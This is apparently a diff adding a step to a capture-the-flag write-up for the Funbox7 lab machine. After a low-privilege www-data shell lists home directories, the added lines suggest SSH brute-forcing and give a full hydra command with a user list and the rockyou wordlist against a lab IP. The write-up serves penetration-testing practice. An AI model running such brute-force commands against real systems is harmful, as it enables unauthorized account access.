@@ -20,3 +20,7 @@ I got a low privilege shell as www-data. All I am able to see are the users on t
 www-data@funbox7:/$ ls home
 ls home
 goat  harry  karla  oracle  sally
+
+The ssh port was open, so it is now a good call to try ssh bruteforcing after all I have not noticed any kind of WAF.
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.51.132 -t 4 ssh
+...and now just wait
